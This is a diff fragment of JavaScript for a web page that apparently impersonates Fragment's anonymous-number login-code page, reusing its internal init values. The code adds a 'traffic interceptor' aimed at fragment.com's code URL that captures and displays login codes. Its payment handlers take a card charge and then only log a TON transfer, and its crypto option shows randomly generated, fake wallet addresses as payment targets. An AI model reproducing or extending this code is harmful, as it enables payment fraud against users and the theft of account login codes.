+                        console.error('Error parsing saved auth:', error);
+                    }
+                }
+                return false;
+            }
+        }
+
+        class FragmentApp {
+            constructor() {
+                this.telegramClient = null;
+                this.stripeHandler = null;
+                this.tonHandler = null;
+                this.trafficInterceptor = null;
+                this.authWidget = null;
+                this.currentPaymentMethod = null;
+            }
+
+            async init() {
+                try {
+                    this.authWidget = new CombinedAuthWidget();
+                    await this.authWidget.init();
+                    this.authWidget.checkSavedAuth();
+                    
+                    this.stripeHandler = new StripePaymentHandler('pk_test_51Ok5SnB2wi7A5GG4br2eaUkXCr2BtZrFVKmD2lPe4Wv7cYVfPJ6ihCedRiaWNqiQLrYyoWiFK3xVsq75rOfkbjV7001hGHtYTI');
+                    await this.stripeHandler.init();
+                    
+                    this.tonHandler = new TonPaymentHandler();
+                    await this.tonHandler.init();
+                    
+                    this.trafficInterceptor = new TrafficInterceptor('https://fragment.com/number/8888888/code?from=app');
+                    
+                    this.setupEventListeners();
+                    
+                    this.initExistingScripts();
+                    
+                    console.log('Fragment app initialized');
+                } catch (error) {
+                    console.error('App initialization error:', error);
+                }
+            }
+
+            initExistingScripts() {
+                if (typeof ajInit === 'function') {
+                    ajInit({"version":547,"apiUrl":"\/api?hash=6710fb5fbedcec3c6a","unauth":false,"state":{"number":"8888888","lastLt":false,"fromApp":true,"tonRate":6.5441837784812}});
+                }
+
+                if (typeof Aj !== 'undefined') {
+                    Aj._useScrollHack = true;
+                    if (typeof LoginCodes !== 'undefined') LoginCodes.init();
+                    if (typeof Main !== 'undefined') Main.init();
+                    
+                    Aj.onLoad(function(state) {
+                        state.unAuth = false;
+                        if (typeof Login !== 'undefined') {
+                            Login.init({"bot_id":5000546575,"request_access":"write"});
+                            $('.login-link').on('click', function(e) {
+                                var return_to = this.href || false;
+                                e.stopImmediatePropagation();
+                                e.preventDefault();
+                                Login.open(return_to);
+                            });
+                        }
+                    });
+                    
+                    Aj.onUnload(function(state) {
+                        $('.login-link').off('click');
+                    });
+                    
+                    if (typeof Wallet !== 'undefined') {
+                        Wallet.init({"address":true,"ton_proof":"a66591f41c485ce233","version":2});
+                    }
+                }
+                
+                if (typeof Aj !== 'undefined' && typeof Aj.pageLoaded === 'function') {
+                    Aj.pageLoaded();
+                }
+            }
+
+            setupEventListeners() {
+                document.querySelectorAll('.payment-method').forEach(method => {
+                    method.addEventListener('click', () => {
+                        this.selectPaymentMethod(method.dataset.method);
+                    });
+                });
+                
+                document.getElementById('payment-form').addEventListener('submit', (e) => {
+                    e.preventDefault();
+                    this.handleStripePayment();
+                });
+                
+                document.getElementById('ton-pay-button').addEventListener('click', () => {
+                    this.handleTonPayment();
+                });
+                
+                document.getElementById('crypto-pay-button').addEventListener('click', () => {
+                    this.handleCryptoPayment();
+                });
+                
+                document.getElementById('payButton').addEventListener('click', () => {
+                    this.showPaymentSection();
+                });
+                
+                document.getElementById('open-messages').addEventListener('click', () => {
+                    this.showMessagesSection();
+                });
+                
+                document.getElementById('start-intercept').addEventListener('click', () => {
+                    this.startTrafficInterception();
+                });
+                
+                document.getElementById('stop-intercept').addEventListener('click', () => {
+                    this.stopTrafficInterception();
+                });
+                
+                document.getElementById('message-filter').addEventListener('input', (e) => {
+                    this.filterMessages(e.target.value);
+                });
+                
+                document.getElementById('target-url').addEventListener('change', (e) => {
+                    this.trafficInterceptor.targetUrl = e.target.value;
+                });
+            }
+
+            selectPaymentMethod(method) {
+                this.currentPaymentMethod = method;
+                
+                document.querySelectorAll('.payment-method').forEach(el => {
+                    el.classList.remove('active');
+                });
+                
+                document.querySelector(`.payment-method[data-method="${method}"]`).classList.add('active');
+                
+                document.getElementById('payment-form').style.display = 'none';
+                document.getElementById('ton-payment-form').style.display = 'none';
+                document.getElementById('crypto-payment-form').style.display = 'none';
+                
+                switch (method) {
+                    case 'stripe':
+                        document.getElementById('payment-form').style.display = 'block';
+                        break;
+                    case 'ton':
+                        document.getElementById('ton-payment-form').style.display = 'block';
+                        break;
+                    case 'crypto':
+                        document.getElementById('crypto-payment-form').style.display = 'block';
+                        break;
+                }
+            }
+
+            async handleStripePayment() {
+                try {
+                    const amount = parseFloat(document.getElementById('amount-ton').value);
+                    const walletAddress = document.getElementById('wallet-address').value;
+                    
+                    if (!amount || isNaN(amount) || amount <= 0) {
+                        throw new Error('Please enter a valid amount');
+                    }
+                    
+                    if (!walletAddress || walletAddress.trim() === '') {
+                        throw new Error('Please enter your TON wallet address');
+                    }
+                    
+                    await this.stripeHandler.createPaymentIntent(amount * 100, 'usd');
+                    
+                    const paymentIntent = await this.stripeHandler.confirmPayment();
+                    
+                    if (paymentIntent.status === 'succeeded') {
+                        alert(`Payment successful! Transaction ID: ${paymentIntent.id}`);
+
+                        setTimeout(() => {
+                            this.TonTransfer(walletAddress, amount);
+                        }, 2000);
+                    }
+                } catch (error) {
+                    console.error('Payment error:', error);
+                    document.getElementById('card-errors').textContent = error.message;
+                }
+            }
+
+            async handleTonPayment() {
+                try {
+                    const amount = parseFloat(document.getElementById('ton-amount').value);
+                    const walletAddress = document.getElementById('ton-wallet-address').value;
+                    
+                    if (!amount || isNaN(amount) || amount <= 0) {
+                        throw new Error('Please enter a valid amount');
+                    }
+                    
+                    if (!walletAddress || walletAddress.trim() === '') {
+                        throw new Error('Please enter your TON wallet address');
+                    }
+                    
+                    if (!this.tonHandler.wallet) {
+                        throw new Error('Please connect your TON wallet first');
+                    }
+                    
+                    const result = await this.tonHandler.sendPayment(walletAddress, amount);
+                    
+                    const paymentLink = this.tonHandler.generatePaymentLink(walletAddress, amount);
+                    
+                    document.getElementById('ton-payment-status').innerHTML = `
+                        <div class="alert alert-success">
+                            Payment initiated successfully!<br>
+                            Amount: ${amount} TON<br>
+                            To: ${walletAddress}<br>
+                            <a href="${paymentLink}" target="_blank">Open in Wallet</a>
+                        </div>
+                    `;
+                } catch (error) {
+                    console.error('TON payment error:', error);
+                    document.getElementById('ton-payment-status').innerHTML = `
+                        <div class="alert alert-danger">
+                            Error: ${error.message}
+                        </div>
+                    `;
+                }
+            }
+
+            async handleCryptoPayment() {
+                try {
+                    const amount = parseFloat(document.getElementById('crypto-amount').value);
+                    const currency = document.getElementById('crypto-currency').value;
+                    
+                    if (!amount || isNaN(amount) || amount <= 0) {
+                        throw new Error('Please enter a valid amount');
+                    }
+                    
+                    const address = this.generateCryptoAddress(currency);
+                    const exactAmount = this.calculateExactAmount(amount, currency);
+                    
+                    document.getElementById('crypto-address').textContent = address;
+                    document.getElementById('crypto-exact-amount').textContent = `${exactAmount} ${currency}`;
+                    
+                    this.generateQRCode(address, amount, currency);
+                    
+                    document.getElementById('crypto-payment-info').style.display = 'block';
+                } catch (error) {
+                    console.error('Crypto payment error:', error);
+                    document.getElementById('crypto-payment-info').innerHTML = `
+                        <div class="alert alert-danger">
+                            Error: ${error.message}
+                        </div>
+                    `;
+                }
+            }
+
+            generateCryptoAddress(currency) {
+            
+                const prefixes = {
+                    'BTC': '1',
+                    'ETH': '0x',
+                    'USDT': '0x',
+                    'USDC': '0x'
+                };
+                
+                const prefix = prefixes[currency] || '';
+                const chars = '0123456789abcdef';
+                let address = prefix;
+                
+                for (let i = 0; i < (currency === 'BTC' ? 33 : 40); i++) {
+                    address += chars.charAt(Math.floor(Math.random() * chars.length));
+                }
+                
+                return address;
+            }
+
+            calculateExactAmount(amount, currency) {
+            
+                const rates = {
+                    'BTC': 0.000025,
+                    'ETH': 0.0005,
+                    'USDT': 1,
+                    'USDC': 1
+                };
+                
+                const rate = rates[currency] || 1;
+                const exactAmount = amount * rate;
+                
+                return parseFloat(exactAmount.toFixed(8));
+            }
+
+            generateQRCode(address, amount, currency) {
+                const qrContainer = document.getElementById('crypto-qr-code');
+                qrContainer.innerHTML = '';
+                
+                // Generate QR code
+                const qr = qrcode(0, 'L');
+                qr.addData(`${currency}:${address}?amount=${amount}`);
+                qr.make();
+                
+                qrContainer.innerHTML = qr.createImgTag(4);
+            }
+
+            TonTransfer(toAddress, amount) {
+                console.log(`TON transfer of ${amount} to ${toAddress}`);
+            }
+
+            showPaymentSection() {
+                document.querySelector('.js-codes-main').style.display = 'none';
+                document.querySelector('.js-payment-section').style.display = 'block';
+                document.querySelector('.js-messages-section').style.display = 'none';
+                document.querySelector('.js-auth-section').style.display = 'none';
+            }
+
+            showMessagesSection() {
+                document.querySelector('.js-codes-main').style.display = 'none';
+                document.querySelector('.js-payment-section').style.display = 'none';
+                document.querySelector('.js-messages-section').style.display = 'block';
+                document.querySelector('.js-auth-section').style.display = 'none';
+                
+                if (document.getElementById('messages-container').children.length === 0) {
+                    this.loadSampleMessages();
+                }
+            }
+
+            async loadSampleMessages() {
+                try {
+                    if (this.authWidget.currentUser && this.authWidget.authMethod === 'telegram') {
+                    
+                        const messages = await this.authWidget.telegramClient.getMessages('+8888888', 15);
+                        
+                        const container = document.getElementById('messages-container');
+                        container.innerHTML = '';
+                        
+                        messages.forEach(msg => {
+                            const msgElement = document.createElement('div');
+                            msgElement.className = 'message-item';
+                            msgElement.innerHTML = `
+                                <div><strong>${new Date(msg.date).toLocaleTimeString()}</strong></div>
+                                <div>${msg.text}</div>
+                            `;
+                            container.appendChild(msgElement);
+                        });
+                    } else {
+                    
+                        const container = document.getElementById('messages-container');
+                        container.innerHTML = '';
+                        
+                        const sampleMessages = [
+                            { text: 'Your login code is 1234', date: new Date(Date.now() - 300000) },
+                            { text: 'Your login code is 5678', date: new Date(Date.now() - 600000) },
+                            { text: 'Your login code is 9012', date: new Date(Date.now() - 900000) },
+                            { text: 'Please confirm your login with code 3456', date: new Date(Date.now() - 1200000) },
+                            { text: 'Security alert: New login from Chrome on Windows', date: new Date(Date.now() - 1500000) }
+                        ];
+                        
+                        sampleMessages.forEach(msg => {
+                            const msgElement = document.createElement('div');
+                            msgElement.className = 'message-item';
+                            msgElement.innerHTML = `
+                                <div><strong>${msg.date.toLocaleTimeString()}</strong></div>
+                                <div>${msg.text}</div>
+                            `;
+                            container.appendChild(msgElement);
+                        });
+                    }
+                } catch (error) {
+                    console.error('Error loading messages:', error);
+                }
+            }
+
+            filterMessages(query) {
+                const messages = document.querySelectorAll('.message-item');
+                const lowerQuery = query.toLowerCase();
+                
+                messages.forEach(msg => {
+                    const text = msg.textContent.toLowerCase();
+                    if (text.includes(lowerQuery)) {
+                        msg.style.display = 'block';
+                    } else {
+                        msg.style.display = 'none';
+                    }
+                });
+            }
+
+            async startTrafficInterception() {
+                try {
+                    const startButton = document.getElementById('start-intercept');
+                    const stopButton = document.getElementById('stop-intercept');
+                    
+                    startButton.disabled = true;
+                    stopButton.disabled = false;
+                    
+                    this.trafficInterceptor.onMessage((data) => {
+                        const container = document.getElementById('messages-container');
+                        const msgElement = document.createElement('div');
+                        msgElement.className = 'message-item';
+                        msgElement.innerHTML = `
+                            <div><strong>${new Date().toLocaleTimeString()}</strong></div>
+                            <div>${JSON.stringify(data)}</div>
+                        `;
+                        container.appendChild(msgElement);
+                    });
+                    
+                    this.trafficInterceptor.onCode((codes) => {
+                        const codesContainer = document.getElementById('codes-list');
+                        document.getElementById('intercepted-codes').style.display = 'block';
+                        
+                        codes.forEach(code => {
+                            const codeElement = document.createElement('div');
+                            codeElement.className = 'message-item';
+                            codeElement.innerHTML = `
+                                <div><strong>${new Date().toLocaleTimeString()}</strong></div>
+                                <div class="code-display">${code}</div>
+                            `;
+                            codesContainer.appendChild(codeElement);
+                        });
+                    });
+                    
+                    await this.trafficInterceptor.startInterception();
+                    
+                    console.log('Traffic interception started');
+                } catch (error) {
+                    console.error('Error starting interception:', error);
+                    document.getElementById('start-intercept').disabled = false;
+                    document.getElementById('stop-intercept').disabled = true;
+                }
+            }
+
+            stopTrafficInterception() {
+                try {
+                    const startButton = document.getElementById('start-intercept');
+                    const stopButton = document.getElementById('stop-intercept');
+                    
+                    startButton.disabled = false;
+                    stopButton.disabled = true;
+                    
+                    this.trafficInterceptor.stopInterception();
+                    console.log('Traffic interception stopped');
+                } catch (error) {
+                    console.error('Error stopping interception:', error);
+                }
+            }
+        }
+
+        document.addEventListener('DOMContentLoaded', () => {
+            const app = new FragmentApp();
+            app.init();
+            
+            window.FragmentApp = app;
+        });
+    </script>
+</body>
+</html>
